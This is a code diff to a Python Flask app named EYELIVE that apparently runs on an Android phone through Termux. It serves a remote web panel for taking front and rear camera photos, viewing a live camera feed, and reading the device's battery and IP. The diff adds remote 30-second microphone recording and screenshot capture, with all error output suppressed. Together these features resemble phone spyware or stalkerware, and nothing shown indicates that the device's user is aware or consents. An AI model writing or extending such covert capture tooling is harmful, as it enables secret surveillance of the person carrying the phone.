@@ -62,8 +62,12 @@ def coletar():
 
 threading.Thread(target=coletar, daemon=True).start()
 
-# HTML omitido por brevidade - mesmo da versao anterior
-HTML = r"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>EYELIVE</title><style>:root{--bg:#0a0a0f;--card:#111122;--gold:#ffd700;--green:#00ff88;--text:#e0e0e0}*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.header{background:#000;padding:12px 15px;display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--gold)}.header h1{font-size:1.2em;color:var(--gold)}.pulse{display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;margin-right:5px;animation:pulse 1.5s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}.nav{display:flex;background:#000;overflow-x:auto;border-bottom:1px solid#222}.nav a{padding:12px 15px;color:#888;text-decoration:none;font-size:.8em;white-space:nowrap;border-bottom:2px solid transparent}.nav a.active,.nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}.container{padding:15px}.cam-card{background:var(--card);border:1px solid#222;border-radius:15px;overflow:hidden;margin-bottom:12px}.cam-card h3{padding:10px 15px;color:var(--gold);font-size:.9em;border-bottom:1px solid#222}.cam-view{width:100%;height:200px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:3em;overflow:hidden}.cam-view img{width:100%;height:100%;object-fit:cover}.cam-btns{padding:10px;display:flex;gap:8px}.card{background:var(--card);border:1px solid#222;border-radius:15px;padding:15px;margin-bottom:15px}.card h3{color:var(--gold);font-size:.9em;margin-bottom:10px}.btn{padding:10px 18px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:.8em}.btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#000}.tab-content{display:none}.tab-content.active{display:block}.info-row{display:flex;justify-content:space-between;padding:5px 0;color:#aaa;font-size:.85em}.info-row span:last-child{color:#fff}.galeria{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px}.galeria img{width:100%;height:100px;object-fit:cover;border-radius:8px;cursor:pointer}</style></head><body><div class="header"><div><h1>EYELIVE</h1><span style="color:var(--green);font-size:.75em"><span class="pulse"></span> {DEVICE}</span></div></div><div class="nav"><a href="#" class="active" onclick="tab(\'cameras\',this)">📷 Cameras</a><a href="#" onclick="tab(\'galeria\',this)">🖼️ Galeria</a><a href="#" onclick="tab(\'info\',this)">📊 Info</a></div><div class="container"><div id="tab-cameras" class="tab-content active"><div class="cam-card"><h3>📷 Frontal</h3><div class="cam-view" id="frontal-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto(\'frontal\')">📸 Foto</button><button class="btn btn-green" onclick="live(\'frontal\')">▶️ Live</button></div></div><div class="cam-card"><h3>📷 Traseira</h3><div class="cam-view" id="traseira-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto(\'traseira\')">📸 Foto</button><button class="btn btn-green" onclick="live(\'traseira\')">▶️ Live</button></div></div></div><div id="tab-galeria" class="tab-content"><div class="card"><h3>🖼️ Ultimas Fotos</h3><div class="galeria" id="galeria"></div></div></div><div id="tab-info" class="tab-content"><div class="card"><h3>📊 Dispositivo</h3><div class="info-row"><span>Nome:</span><span id="info-nome">--</span></div><div class="info-row"><span>Bateria:</span><span id="info-bat">--</span></div><div class="info-row"><span>IP:</span><span id="info-ip">--</span></div><div class="info-row"><span>Fotos:</span><span id="info-fotos">0</span></div></div></div></div><script>var liveTimers={};function tab(t,el){document.querySelectorAll(\'.tab-content\').forEach(x=>x.classList.remove(\'active\'));document.querySelectorAll(\'.nav a\').forEach(a=>a.classList.remove(\'active\'));document.getElementById(\'tab-\'+t).classList.add(\'active\');el.classList.add(\'active\')}function foto(cam){fetch(\'/cmd/foto_\'+cam).then(r=>r.json()).then(d=>{alert(d.msg);atualizarFotos()})}function live(cam){document.getElementById(cam+\'-view\').innerHTML=\'<img src="/live/\'+cam+\'?t=\'+Date.now()+\'" id="live-\'+cam+\'">\';liveTimers[cam]=setInterval(function(){var img=document.getElementById(\'live-\'+cam);if(img)img.src=\'/live/\'+cam+\'?t=\'+Date.now()},3000)}function atualizarFotos(){fetch(\'/api/status\').then(r=>r.json()).then(d=>{var h=\'\';(d.fotos||[]).forEach(function(f){h+=\'<img src="/foto/\'+f+\'" onclick="window.open(this.src)">\'});document.getElementById(\'galeria\').innerHTML=h||\'<p style="color:#888">Nenhuma foto</p>\';document.getElementById(\'info-fotos\').textContent=(d.fotos||[]).length})}function update(){fetch(\'/api/status\').then(r=>r.json()).then(d=>{document.getElementById(\'info-bat\').textContent=d.bateria+(d.carregando?\' [CARREGANDO]\':\'\');document.getElementById(\'info-ip\').textContent=d.ip;document.getElementById(\'info-nome\').textContent=d.nome})}setInterval(update,5000);setInterval(atualizarFotos,10000);update();atualizarFotos()</script></body></html>"""
+# HTML carregado do arquivo index.html
+try:
+    with open('index.html', 'r') as f:
+        HTML = f.read()
+except:
+    HTML = "<h1>EYELIVE</h1><p>Erro ao carregar</p>"
 
 @app.route('/')
 def index():
@@ -80,13 +84,19 @@ def comando(comando):
         nome = f"frontal_{t}.jpg"
         path = f"{FOTOS_DIR}/{nome}"
         threading.Thread(target=lambda: shell(f"termux-camera-photo -c 0 {path} 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Foto frontal OK!","foto":nome})
+        return jsonify({"msg":"Foto frontal OK!"})
     elif comando == 'foto_traseira':
         t = datetime.now().strftime("%H%M%S")
         nome = f"traseira_{t}.jpg"
         path = f"{FOTOS_DIR}/{nome}"
         threading.Thread(target=lambda: shell(f"termux-camera-photo -c 1 {path} 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Foto traseira OK!","foto":nome})
+        return jsonify({"msg":"Foto traseira OK!"})
+    elif comando == 'audio':
+        threading.Thread(target=lambda: shell("termux-microphone-record -f /tmp/eyelive_audio.aac -l 30 -q 2>/dev/null"), daemon=True).start()
+        return jsonify({"msg":"Gravando 30s..."})
+    elif comando == 'screenshot':
+        threading.Thread(target=lambda: shell("screencap /tmp/eyelive_screenshot.png 2>/dev/null"), daemon=True).start()
+        return jsonify({"msg":"Screenshot OK!"})
     return jsonify({"msg":"OK"})
 
 @app.route('/live/<cam>')
